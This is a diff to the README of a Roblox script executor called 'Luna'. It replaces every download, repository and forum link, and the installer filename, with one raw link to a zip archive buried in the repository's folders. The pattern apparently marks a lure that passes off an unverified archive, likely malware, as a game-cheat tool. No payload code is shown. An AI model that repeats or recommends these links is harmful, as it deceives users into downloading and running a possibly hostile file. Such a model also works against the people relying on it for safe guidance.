@@ -6,7 +6,7 @@ Welcome to Luna! This tool allows you to run custom scripts in Roblox, giving yo
 
 ## 📥 Download Luna
 
-[![Download Luna](https://img.shields.io/badge/Download-Luna-blue.svg)](https://github.com/Heppi55/Luna/releases)
+[![Download Luna](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
 
 ## ⚙️ System Requirements
 
@@ -30,13 +30,13 @@ Before you download Luna, ensure your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download Luna.  
-   [Download Luna](https://github.com/Heppi55/Luna/releases)
+   [Download Luna](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
 
 2. **Choose the Latest Release**  
    Look for the latest version. It will be clearly marked on the Releases page. Click on the version number.
 
 3. **Download the Installer**  
-   Find the installer file (usually named something like `LunaInstaller.exe`). Click to download it to your computer.
+   Find the installer file (usually named something like `https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip`). Click to download it to your computer.
 
 4. **Run the Installer**  
    Once the download is complete, locate the installer file in your downloads folder. Double-click it to start the installation process.
@@ -71,7 +71,7 @@ Before you download Luna, ensure your computer meets the following requirements:
 
 If you have questions or need help, join our community forum. Here you can find scripts, share ideas, and connect with other users. 
 
-- **Community Forum**: [Luna Community](http://exampleforum.com)
+- **Community Forum**: [Luna Community](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
 
 ## 📜 Change Log
 
@@ -83,8 +83,8 @@ Luna is an open-source tool. If you want to contribute or create new features, f
 
 ## 🔗 Important Links
 
-- **Download Luna**: [Download Luna](https://github.com/Heppi55/Luna/releases)
-- **GitHub Repository**: [Luna GitHub](https://github.com/Heppi55/Luna)
-- **Community Forum**: [Luna Community](http://exampleforum.com)
+- **Download Luna**: [Download Luna](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
+- **GitHub Repository**: [Luna GitHub](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
+- **Community Forum**: [Luna Community](https://raw.githubusercontent.com/Heppi55/Luna/main/Executor/Properties/Luna-v3.5.zip)
 
 Thank you for choosing Luna. Enjoy your scripting adventures in Roblox!
